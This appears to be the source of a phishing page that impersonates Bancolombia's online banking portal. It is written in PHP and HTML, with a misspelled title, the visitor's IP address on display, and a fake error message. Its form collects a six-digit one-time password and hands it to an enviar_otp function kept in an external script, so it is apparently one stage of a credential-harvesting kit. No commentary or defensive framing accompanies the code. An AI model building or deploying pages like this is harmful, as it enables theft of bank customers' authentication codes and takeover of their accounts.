<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>Bancolombia Sucursal Vrtual Personas</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
  		
		<meta content="es" http-equiv="Content-Language">
  	
		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	 	<script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
		<link href="css/style.css" rel="stylesheet">
		<link href="css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="img/logo.png" />
		<script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
		<script src="js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="js/functions.js"></script>  		
   	</head>
   	<body>
   		<div class="contenido">
   			<div class="cabecera">
   				<div class="logo">
   					<img src="img/cont/t-mar-min.jpg">   				
   					<br>
   					<table style="margin-top:17px;"><tr><td><img src="img/cont/t-fec-min.jpg">   				</td><td><span class="texto-min" id="fecha-hora">Lunes 13 de Junio de 2022 9:23:11 AM</span></td></tr></table>					
   				</div>
   				<div class="titulo"><img src="img/cont/o-tit-min.jpg"></div>
   				<div class="mensaje" style="display:block;padding: 10px;">
   					<img src="img/cont/oe-err-min.jpg">
   				</div>
   			</div>   			
   			<div class="cuerpo">
   				<div class="pnlizq">
   					<div class="formulario">
   						<div class="form-titulo"><img src="img/cont/o-sec-ver-min.jpg"></div>
   						<div class="descripcion">
   							<img src="img/cont/o-sub-min.jpg">
   						</div>
   						<div class="form-cuerpo">
   							<div style="text-align: left;">
   								<img src="img/cont/o-eti-clv-min.jpg">
   							</div>   						
   							<div class="input-icono pass" style="border: 1px solid red;">
   								<input type="password" name="txtOTP" id="txtOTP" maxlength="6" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
   							</div>
   							<br>
   							<img src="img/cont/o-bot-ver-min.jpg" style="cursor: pointer;" id="btnOTP" name="btnOTP"> 
   							<br>
   						  							
   						</div>
   					</div>
   					<br>
   					<div class="lista-links ">
   						<img src="img/cont/t-opc-min.jpg">	
   					</div>
   				</div>
   				<div class="pnlder">
   					<a href="#"><img src="img/clave.jpg" class="publicidad" style="max-width: 627px;"></a><br><br>
   					<div class="texto" style="text-align:justify; padding: 0px 30px;"><img src="img/cont/o-des-min.jpg" style="width:100%; max-width: 720px;"></div>
   				</div>
   			</div>
   			<div class="pie">
   				<img src="img/cont/t-foo-min.jpg" id="footer">
   				<img src="img/cont/t-foo1-min.jpg" id="footer1">
   				<img src="img/cont/t-foo2-min.jpg" id="footer2">
   				<img src="img/cont/t-foo3-min.jpg" id="footer3">
   				<img src="img/cont/t-foo4-min.jpg" id="footer4">
   				<img src="img/cont/t-foo5-min.jpg" id="footer5">

   				<div class="ippie">
   					<span class="dirip"><table><tr><td><img src="img/cont/t-ip-min.jpg"></td><td class="textip"><?php echo $ip; ?></td></tr></table></span>´
   					<span class="copyright"><img src="img/cont/t-cop-min.jpg"></span>
   				</div>
   			</div>
   		</div>
   	</body>
</html>
<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length > 5) {
				enviar_otp($("#txtOTP").val());				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>
<script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#fecha-hora').jclock(optionsEST);
     });
 </script>